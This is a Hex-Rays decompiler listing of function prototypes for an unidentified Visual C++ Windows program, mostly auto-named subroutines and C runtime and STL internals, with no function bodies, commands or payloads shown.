/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// int __usercall sub_401000@<eax>(int a1@<ecx>, int a2@<edi>, int a3@<esi>, _DWORD *a4);
// int __usercall sub_401040@<eax>(int a1@<eax>, int a2@<ecx>, int *a3);
// int __usercall sub_4010A0@<eax>(int a1@<eax>, int a2@<ecx>, _DWORD *a3);
// int __usercall sub_401130@<eax>(int a1@<eax>, int a2@<ecx>, int *a3);
int __cdecl sub_4012C0(const char *a1, const char *a2, int a3);
unsigned __int64 __cdecl sub_401310(int a1, int a2);
int __cdecl sub_4014B0(int a1, int a2);
int __cdecl sub_401730(_DWORD *a1, _DWORD *a2);
// int __usercall sub_401760@<eax>(_DWORD *a1@<edx>, unsigned __int64 a2);
// int __usercall sub_4017E0@<eax>(int a1@<eax>, int *a2, _DWORD *a3, int a4, unsigned int a5, int a6, unsigned int a7, int a8, unsigned int a9);
int __cdecl sub_401C90(int a1, int *a2, int a3, unsigned int a4, int a5, unsigned int a6, int a7, unsigned int a8);
int __cdecl sub_401CC0(int a1);
int __cdecl sub_401D30(int a1);
int __cdecl sub_401DE0(int a1, const char *a2, int a3);
// int __usercall sub_401F10@<eax>(int a1@<esi>, _DWORD *a2, _DWORD *a3, _DWORD *a4);
// int __usercall sub_402140@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4, unsigned int a5);
int __cdecl sub_4023D0(int a1);
// void *__usercall sub_402470@<eax>(const void *a1@<eax>, int a2, int a3);
void *__cdecl sub_4028E0(int a1);
int __cdecl sub_402900(_DWORD *Block);
int __cdecl sub_402940(int a1, _DWORD *a2, _DWORD *a3, int a4, int a5);
int __cdecl sub_402B70(int a1);
int __cdecl sub_402B90(int a1, int a2, int a3);
int __cdecl sub_402BD0(int a1, int a2, int a3, int a4, int a5);
int __cdecl sub_402C30(int a1, int a2);
FILE *__cdecl sub_402C70(int a1, char *FileName, char a3);
size_t __cdecl sub_402CC0(int a1, FILE *Stream, void *Buffer, size_t ElementCount);
size_t __cdecl sub_402CE0(int a1, FILE *Stream, void *Buffer, size_t ElementCount);
__int64 __cdecl sub_402D00(int a1, FILE *Stream);
int __cdecl sub_402D20(int a1, FILE *Stream, __int64 Offset, int a4); // idb
int __cdecl sub_402D70(int a1, FILE *Stream); // idb
int __cdecl sub_402D90(int a1, FILE *Stream); // idb
FILE *(__cdecl **__cdecl sub_402DB0(FILE *(__cdecl **a1)(int a1, char *FileName, char a3)))(int a1, char *FileName, char a3);
int __cdecl sub_4030C0(int a1, _BYTE *a2, unsigned int a3);
int __cdecl sub_4030E0(_DWORD *a1);
int __cdecl sub_403160(_DWORD *a1);
int __cdecl sub_403190(int a1, int a2);
int __cdecl sub_403220(_DWORD *a1, int a2, _BYTE *a3, int a4);
// _DWORD *__usercall sub_4032E0@<eax>(_DWORD *result@<eax>);
// int __usercall sub_403300@<eax>(int a1@<eax>, int a2@<ebx>);
// int __usercall sub_403400@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int *a3, int a4);
int __cdecl sub_404930(_DWORD *a1);
void *__cdecl sub_404980(int a1, int a2, int a3);
void __cdecl sub_4049A0(int a1, void *Block);
// int *__usercall sub_404AC0@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int *a3, int a4);
int __cdecl sub_405160(int a1, int a2, unsigned int a3, _DWORD **a4, unsigned int *a5, char *a6);
unsigned int __cdecl sub_405550(unsigned int a1, unsigned __int8 *a2, unsigned int a3);
int sub_4057C0();
int sub_4057E0();
int sub_4057FD();
int sub_405813();
int sub_40581F();
int sub_40582B();
int sub_405837();
void *sub_405850();
int __cdecl sub_405860(int *a1, int a2, int a3);
// DWORD __userpurge StartAddress@<eax>(int a1@<esi>, LPVOID lpThreadParameter);
// void __usercall sub_405920(int a1@<edx>, int a2@<ecx>, __m64 a3@<mm0>, __m64 a4@<mm1>);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
void __thiscall sub_405C00(_DWORD *this);
void __cdecl sub_405C50(_BYTE *a1, unsigned int a2);
int __thiscall sub_405C90(int this, char *a2);
int __stdcall sub_405D70(void *a1, _DWORD *a2, void **a3);
int __stdcall sub_405D90(void *a1, _DWORD *a2, void **a3);
int __stdcall sub_405DB0(void *a1, _DWORD *a2, void **a3);
void **__thiscall sub_405DD0(void **this, unsigned int a2, int a3, const void *a4);
const void **__thiscall sub_405F00(const void **Src, unsigned int a2, int a3, int a4, int a5, const void *a6, int a7);
void **__thiscall sub_4060C0(void **Src, unsigned int a2, int a3, const void *a4, int a5);
const void **__thiscall sub_406240(const void **Src, unsigned int a2, int a3, size_t Size, const void *a5, size_t a6);
void **__thiscall sub_4063C0(void **Src, unsigned int a2, int a3, const void *a4, size_t a5);
void **__thiscall sub_406520(void **Src, unsigned int a2, int a3, size_t a4, char a5);
_DWORD *__thiscall sub_406680(_DWORD *Src, unsigned int a2, int a3, unsigned int a4, unsigned __int16 a5);
void **__thiscall sub_406820(void **Src, char *Srca);
_DWORD *__cdecl sub_406A10(int a1);
char *__cdecl sub_406B80(int a1);
_DWORD *__thiscall sub_406D10(_DWORD *this, _DWORD *Src);
void **__thiscall sub_406DE0(void **this, void *Src);
_DWORD *__thiscall sub_406E20(_DWORD *this, _DWORD *Src);
struct std::_Locinfo *__thiscall sub_406F00(struct std::_Locinfo *this, char *Locale);
char *__thiscall sub_406FC0(char *this, int a2, int a3, _DWORD *Src);
char *__thiscall sub_407090(char *this, int a2);
char *__thiscall sub_4070E0(char *this, int a2);
char *__thiscall sub_407110(char *this, int a2);
char *__thiscall sub_407160(char *this, char *Src, int *a3);
char *__thiscall sub_407230(char *this, _DWORD *a2);
int __thiscall sub_4072D0(int this, _DWORD *Src, int a3, int a4);
char *__thiscall sub_407320(char *this, int a2);
char *__thiscall sub_407360(char *this, int a2);
char *__thiscall sub_4073C0(char *this, int a2);
void __thiscall sub_407490(int this);
void __thiscall sub_407560(struct std::ios_base *this);
int __thiscall sub_4075B0(_DWORD *this);
int __thiscall sub_4075D0(_DWORD *this);
void __thiscall sub_407630(std::_Lockit *this);
int __thiscall sub_407720(_DWORD *this);
void __thiscall sub_4077E0(_DWORD *this);
int __thiscall sub_407830(int this);
void __thiscall sub_407980(char *this);
char *__thiscall sub_407A09(char *this, char a2);
char *__thiscall sub_407A11(_DWORD *this, char a2);
void *__thiscall sub_407A20(void *Block, char a2);
char *__thiscall sub_407A50(char *this, char a2);
char *__thiscall sub_407A80(struct std::ios_base *this, char a2);
_DWORD *__thiscall sub_407B00(_DWORD *Block, char a2);
_DWORD *__thiscall sub_407B90(_DWORD *Block, char a2);
void *__thiscall sub_407BC0(void *Block, char a2);
_DWORD *__thiscall sub_407C20(_DWORD *Block, char a2);
_DWORD *__thiscall sub_407C50(_DWORD *Block, char a2);
char *__thiscall sub_407C80(char *Block, char a2);
char *__thiscall sub_407CB0(char *Block, char a2);
_DWORD *__thiscall sub_407CE0(_DWORD *Block, char a2);
struct std::ios_base *__thiscall sub_407DC0(struct std::ios_base *Block, char a2);
CERT_CONTEXT *sub_407E20();
// void __userpurge sub_407ED0(int a1@<edx>, int a2@<ecx>, _DWORD *a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49, int a50, int a51, int a52, int a53, int a54, int a55, int a56, int a57, int a58, int a59, int a60, int a61, int a62, int a63);
// void __usercall sub_407F35(_DWORD *a1@<ebp>, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19);
// void __usercall sub_407F62(unsigned int *a1@<ebp>, __int16 a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13);
_DWORD sub_408044(); // weak
void __cdecl sub_40806D(int a1, int a2, int a3, char a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20);
// int __userpurge sub_408129@<eax>(char a1@<cl>, unsigned int *a2@<ebp>, int a3@<edi>, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24);
// void __usercall sub_408151(_DWORD *a1@<ebp>, int a2, int a3, int a4, __int16 a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15);
// int __userpurge sub_408169@<eax>(int a1@<eax>, int a2@<ebx>, unsigned int *a3@<ebp>, int a4@<edi>, int a5@<esi>, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26);
void __cdecl sub_4081BA(int a1);
// char __usercall sub_40822C@<al>(char a1@<al>, int a2@<ebp>);
int sub_408322();
// char __usercall sub_408328@<al>(int a1@<ebp>);
// int __usercall sub_408360@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, char *lpFileName, void *Src);
void __cdecl sub_4085D0(char *FileName);
UINT __cdecl sub_408620(int a1);
UINT __cdecl sub_408680(int a1);
void __thiscall sub_4086F0(void **this);
volatile signed __int32 *__thiscall sub_408740(volatile signed __int32 *this);
char __thiscall sub_408760(void *this);
void __thiscall sub_4088D0(int **this);
void __thiscall sub_408C60(volatile signed __int32 *this);
int __thiscall sub_408C70(int this, FILE *Stream, int a3);
_DWORD *__thiscall sub_408D70(_DWORD *this);
void __thiscall sub_408DD0(FILE **this);
int __cdecl sub_408DF0(int a1, int a2, int a3, __int128 a4, __int64 a5);
unsigned int __fastcall sub_408F40(int *a1);
// int __thiscall std::filebuf::_Reset_back(_DWORD); weak
void __thiscall sub_409060(FILE **this);
void __noreturn sub_409070(void); // weak
void __noreturn sub_409080(void); // weak
void **__thiscall sub_409090(void **Src, _DWORD *Srca);
void **__thiscall sub_409100(void **Src, size_t Size, char a3);
void **__thiscall sub_409160(void **Src, void *Srca, size_t Size);
_DWORD *__thiscall sub_4091C0(_DWORD *Src, unsigned int a2, unsigned __int16 a3);
void **__thiscall sub_409240(void **Src, void *Srca, unsigned int a3);
void **__thiscall sub_4092B0(void **this, size_t Size, char a3);
void **__thiscall sub_4093F0(void **this, void *Src, size_t Size);
int __thiscall sub_409530(_DWORD *this, char a2, char a3);
FILE **__thiscall sub_4095B0(FILE **this);
bool __cdecl sub_409600(LPCWSTR lpPathName, _DWORD *a2);
char sub_409770();
int sub_409780();
int __stdcall sub_409790(int a1, int a2, int a3, _DWORD *a4, int a5, int a6, _DWORD *a7);
unsigned int __stdcall sub_4097B0(int a1, int a2, int a3, unsigned int a4);
int __stdcall sub_4097E0(void *Src, int a2, int a3, void *a4); // idb
int __thiscall sub_409800(int this, unsigned __int8 a2);
_BYTE *__thiscall sub_409820(char *this, _BYTE *a2, unsigned int a3);
int __thiscall sub_409870(int this, unsigned __int8 a2);
_BYTE *__thiscall sub_409890(char *this, _BYTE *a2, unsigned int a3);
int __stdcall sub_409910(void *Src, int a2, void *a3); // idb
bool __thiscall sub_409930(_DWORD *this, _DWORD *a2, int a3);
bool __thiscall sub_409960(void *this, int a2, _DWORD *a3);
// void __usercall sub_4099A0(__m64 a1@<mm0>, __m64 a2@<mm1>, int *a3, int a4, int a5, int a6, int a7, unsigned int a8, void **a9, int a10, int a11, int a12, size_t Size, unsigned int a14);
_DWORD *__thiscall sub_40AE30(_DWORD *this, int a2);
void __thiscall sub_40AE80(struct std::ios_base *this, int a2, char a3);
_DWORD *__cdecl sub_40B040(_DWORD *a1, int a2);
_DWORD *__cdecl sub_40B080(_DWORD *a1, int a2);
void **__stdcall sub_40B0C0(void **a1, int a2);
void **__stdcall sub_40B110(void **a1, int a2);
void **__stdcall sub_40B190(void **Src, DWORD dwMessageId);
const char *sub_40B320();
const char *sub_40B330();
const char *sub_40B340();
int __thiscall sub_40B350(_DWORD *this, char *a2, int a3, int a4);
int __thiscall sub_40B4E0(int this, int a2);
int __stdcall sub_40B700(int a1);
int __fastcall sub_40B710(_DWORD *a1, int a2, int a3);
int __thiscall sub_40BA30(int this, int a2);
const void **__thiscall sub_40BAE0(_DWORD *Src, unsigned int a2, unsigned int a3, char *Srca, unsigned int a5);
void __thiscall sub_40BC80(void **Src, unsigned int a2);
int __thiscall sub_40BDF0(int this, int a2, __int64 a3, int Origin, int a5);
int __stdcall sub_40BEF0(int a1, int a2, int a3, int a4, int a5);
int __thiscall sub_40BF30(int this, int a2, __int64 Offset, fpos_t a4, int a5, int a6, int a7);
int __stdcall sub_40C030(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
FILE **__thiscall sub_40C070(FILE **this, char *Buffer, __int64 Size);
void *__thiscall sub_40C0C0(void *this, int a2, int a3, int a4);
__int64 sub_40C0D0();
int *__cdecl sub_40C0E0(int *a1, LPCWSTR lpFileName);
int *__cdecl sub_40C140(int *a1, LPCWSTR lpFileName, _DWORD *a3);
int __thiscall sub_40C1C0(const WCHAR *lpWideCharStr, int a2);
void **__thiscall sub_40C350(_DWORD *this, void **a2, unsigned int a3, unsigned int a4);
int __thiscall sub_40C3E0(FILE **this);
int __cdecl UserMathErrorFunction();
int __thiscall sub_40C420(int this);
int __thiscall sub_40C6A0(_DWORD **this);
int __thiscall sub_40C6D0(_DWORD **this);
int sub_40C710();
const char *__thiscall sub_40C720(_DWORD *this);
size_t __thiscall sub_40C730(_DWORD **this, char *a2, __int64 a3);
size_t __thiscall sub_40C850(_DWORD **this, unsigned __int8 *Src, __int64 a3);
int __cdecl sub_40C970(void *a1, size_t a2, void *Src, size_t Size); // idb
char __thiscall sub_40CA10(unsigned int *this, const void *a2, int a3, int a4);
unsigned int *__thiscall sub_40CA50(unsigned int *this, int a2);
int __thiscall sub_40CB00(unsigned int *this);
BOOL sub_40CC90();
BOOL sub_40CD60();
void *__cdecl sub_40CE20(LPCWCH lpWideCharStr);
char __thiscall sub_40CE70(unsigned int *this, size_t Size);
unsigned int __fastcall sub_40CF10(unsigned int **a1);
void __noreturn sub_40D0A0(void); // weak
BOOL __cdecl sub_40D0B0(const unsigned __int16 *a1);
_DWORD *__cdecl sub_40D1C0(_DWORD *a1, int Size);
FARPROC __cdecl sub_40D590(char *String2);
// _DWORD __cdecl unknown_libname_2(_DWORD); weak
int __cdecl sub_40D710(int a1, int a2, int a3);
void __cdecl sub_40D760(int a1, int a2);
char *__thiscall sub_40D7B0(int *this, int a2);
_BYTE *__thiscall sub_40DA00(_BYTE *this, int *a2);
_BYTE *__thiscall sub_40DA90(_BYTE *this);
int __thiscall sub_40DAE0(int *this);
int __thiscall sub_40DB30(_BYTE **this);
void __thiscall sub_40DB90(int this);
// int __userpurge sub_40DC80@<eax>(int a1@<ecx>, __m64 a2@<mm0>, __m64 a3@<mm1>, int *a4);
void __stdcall sub_40DD10(int a1, int a2);
int __thiscall sub_40DD80(_BYTE *this);
int __thiscall sub_40DE90(_DWORD **this);
void __stdcall sub_40DEF0(_DWORD *Block, int a2);
int *__thiscall sub_40DF30(int *this);
char *__thiscall sub_40E050(char *this);
bool __thiscall sub_40E060(int *this, int a2);
char __thiscall sub_40E090(int this, const char *a2);
_DWORD *__thiscall sub_40E0E0(int *this);
int *__thiscall sub_40E310(int *this, int a2, __int64 a3);
// _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this); idb
// _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, int); idb
// void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this); idb
char *__thiscall sub_40E5C7(char *this, int a2);
_DWORD *__thiscall sub_40E5E2(_DWORD *this);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const char *const); idb
char *__thiscall sub_40E631(char *this, int a2);
std::exception *__thiscall sub_40E64C(std::exception *this, char *a2);
char *__thiscall sub_40E66D(char *this, int a2);
std::exception *__thiscall sub_40E688(std::exception *this, char *a2);
char *__thiscall sub_40E6A9(char *this, int a2);
char *__thiscall sub_40E6C4(char *this, int a2);
std::exception *__thiscall sub_40E6DF(std::exception *this, char *a2);
void __cdecl __noreturn sub_40E72D(char *a1); // idb
void __cdecl __noreturn sub_40E74D(char *a1); // idb
void __cdecl __noreturn sub_40E76D(char *a1); // idb
// _Ctypevec *__cdecl _Getctype(_Ctypevec *__return_ptr __struct_ptr retstr);
// int __cdecl _Tolower(int, const _Ctypevec *);
// int __cdecl _Toupper(int, const _Ctypevec *);
// void __thiscall std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t(std::_Fac_tidy_reg_t *__hidden this); idb
// void __cdecl std::_Facet_Register(struct std::_Facet_base *); idb
int sub_40EBBD();
// struct std::locale::_Locimp *__cdecl std::locale::_Init(bool); idb
// void __cdecl std::_Locinfo::_Locinfo_ctor(struct std::_Locinfo *, const char *Locale); idb
// void __cdecl std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *); idb
// int __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *); idb
// const char *__cdecl std::_Syserror_map(int); idb
// unsigned int __cdecl std::_Winerror_message(DWORD dwMessageId, LPSTR lpMultiByteStr, DWORD nSize); idb
// void __cdecl std::ios_base::_Addstd(struct std::ios_base *); idb
// void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *); idb
FILE *__cdecl sub_40F177(char *FileName, int a2, int ShFlag);
FILE *__cdecl sub_40F223(char *FileName, int a2, int ShFlag);
// int __cdecl _Make_dir(LPCWSTR lpPathName); idb
// int __cdecl _Stat(LPCWSTR lpFileName, int); idb
// int __cdecl _To_byte(LPCWCH lpWideCharStr, LPSTR lpMultiByteStr); idb
// int __cdecl _To_wide(LPCCH lpMultiByteStr, LPWSTR lpWideCharStr); idb
// unsigned int __cdecl std::_Random_device(); idb
int j____uncaught_exceptions(void); // weak
// int __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection); idb
void __cdecl sub_40F3A5(LPCRITICAL_SECTION lpCriticalSection);
// void __thiscall _Init_atexit::~_Init_atexit(_Init_atexit *__hidden this); idb
void __cdecl sub_40FBF3(void *Block);
int sub_40FCA5();
int sub_40FCAD();
void __cdecl j_j___free_base(void *Block);
// void *__cdecl operator new(size_t Size); idb
void __cdecl j_j_j___free_base(void *Block);
// int __cdecl atexit(void (__cdecl *)());
_DWORD *__thiscall sub_41010C(_DWORD *Block, char a2);
// int __cdecl unknown_libname_7(_DWORD); weak
_DWORD _guard_check_icall_nop(); // weak
int sub_410611();
void sub_41061B();
void *sub_410648();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_41066B();
void *sub_410677();
void *sub_41067D();
LPTOP_LEVEL_EXCEPTION_FILTER sub_410816();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_410863();
void sub_41086B();
void __cdecl sub_410896(); // idb
char *__thiscall sub_41092B(char *this, int a2);
_DWORD *__thiscall sub_410946(_DWORD *this);
void __noreturn sub_41095E(); // weak
void __noreturn sub_41097B(); // weak
// void *__cdecl memmove(void *, const void *Src, size_t Size);
// _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD); weak
// _DWORD __cdecl __std_exception_destroy(_DWORD); weak
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// void *__cdecl memmove_0(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
char *__thiscall sub_413F6C(char *this, int a2);
_DWORD *__thiscall sub_413F87(_DWORD *this);
int __cdecl sub_41528A(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// _DWORD __stdcall unknown_libname_10(_DWORD, _DWORD, char); weak
// _DWORD __stdcall unknown_libname_11(_DWORD, _DWORD, _DWORD, char); weak
// _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_13(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const); idb
// void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(__crt_stdio_output::formatting_buffer *__hidden this); idb
// _DWORD __stdcall unknown_libname_15(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_16(_DWORD); weak
int __thiscall sub_4158E5(int this);
// int __thiscall unknown_libname_17(_DWORD); weak
char __thiscall sub_415A3E(char *this);
char __thiscall sub_415A5D(char *this);
// _DWORD __stdcall unknown_libname_18(_DWORD); weak
char __thiscall sub_415AE8(int this);
char __thiscall sub_415B10(_BYTE *this);
char __thiscall sub_415C79(int this);
char __thiscall sub_415EA8(int this);
// int __cdecl __crt_stdio_output::to_integer_size(_DWORD); weak
// int __thiscall unknown_libname_19(_DWORD); weak
// int __thiscall unknown_libname_20(_DWORD); weak
// _DWORD __stdcall unknown_libname_21(_DWORD); weak
char __thiscall sub_41617C(_DWORD *this, int a2, char a3);
// int __thiscall unknown_libname_22(_DWORD); weak
char __thiscall sub_41633A(_DWORD *this);
char __thiscall sub_416359(_DWORD *this);
// int __thiscall unknown_libname_23(_DWORD); weak
// int __thiscall unknown_libname_24(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_25(_DWORD); weak
// int __stdcall __crt_stdio_output::string_output_adapter<char>::write_string(void *Src, int, int, int); idb
int __cdecl sub_41657B(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// _DWORD __stdcall unknown_libname_26(_DWORD); weak
int __cdecl sub_41670B(int a1);
// void __cdecl _invalid_parameter_noinfo();
// void __cdecl __noreturn _invalid_parameter_noinfo_noreturn();
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
// int __cdecl _stricmp(const char *String1, const char *String2);
void __cdecl j___free_base(void *Block);
int __cdecl sub_416E0F(int a1);
// errno_t __cdecl _get_stream_buffer_pointers(FILE *Stream, char ***Base, char ***Pointer, int **Count);
// void __cdecl _lock_file(FILE *Stream);
// void __cdecl _unlock_file(FILE *Stream);
// int __cdecl fclose(FILE *Stream);
int sub_4171D5();
// _DWORD __cdecl common_flush_all(_DWORD); weak
// int __cdecl fflush(FILE *Stream);
// int __cdecl fgetc(FILE *Stream);
// int __cdecl fgetpos(FILE *Stream, fpos_t *Position);
// FILE *__cdecl _fsopen(const char *FileName, const char *Mode, int ShFlag);
// FILE *__cdecl fopen(const char *FileName, const char *Mode);
// int __cdecl fputc(int Character, FILE *Stream);
// size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// int __cdecl fsetpos(FILE *Stream, const fpos_t *Position);
// int __cdecl _fseeki64(FILE *Stream, __int64 Offset, int Origin);
// int __cdecl fseek(FILE *Stream, int Offset, int Origin);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_417D31(int a1, int a2);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_417FC1(int a1, int a2);
// int __cdecl setvbuf(FILE *Stream, char *Buffer, int Mode, size_t Size);
// int __cdecl ungetc(int Character, FILE *Stream);
// void __cdecl __noreturn terminate();
// void *__cdecl malloc(size_t Size);
// char *__cdecl _strdup(const char *Source);
// __int64 __cdecl _ftelli64(FILE *Stream);
// int __cdecl ferror(FILE *Stream);
// void *__cdecl _calloc_base(size_t Count, size_t Size);
// void __cdecl _free_base(void *Block);
// void *__cdecl _realloc_base(void *Block, size_t Size);
int sub_41A34B();
int __cdecl sub_41A351(int a1);
int __cdecl sub_41A379(int a1);
// int __cdecl unknown_libname_30(void *Block); idb
void *__cdecl sub_41A8AD(void **a1);
void *__cdecl sub_41A8C8(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
int __cdecl sub_41AA06(_DWORD *a1);
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_41ABBE(int a1, int a2);
void __thiscall sub_41ABE6(_DWORD *this);
__int32 sub_41ADA6();
int sub_41BCB5();
// int __cdecl _set_new_mode(int NewMode);
int *sub_41BCEA();
int __cdecl sub_41BCF0(int a1);
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_41BE3C(int a1, int a2);
int __cdecl sub_41BE64(int a1, int a2);
int __cdecl sub_41C0ED(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_41C181();
char sub_41C1AD();
__vcrt_bool sub_41C1F2();
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_41D13A(int a1, int a2);
int __cdecl sub_41D162(int a1, int a2);
int __cdecl sub_41D18A(int a1, int a2);
int __cdecl sub_41D1B2(int a1, int a2);
struct __crt_locale_data *__cdecl sub_41D4B7(int a1, struct __crt_locale_data **a2);
void *__cdecl sub_41D4E4(int a1, void **a2);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_41E307(int a1, int a2);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_41EC00(int a1, int a2);
int __cdecl sub_41EC28(int a1);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_41EF38(int a1, int a2);
char sub_420B56();
// _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_421888(int a1, int a2);
int sub_4225CA();
int __thiscall sub_423F9C(_DWORD **this, void *Block);
// int unknown_libname_38(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4240A6(int a1, int a2);
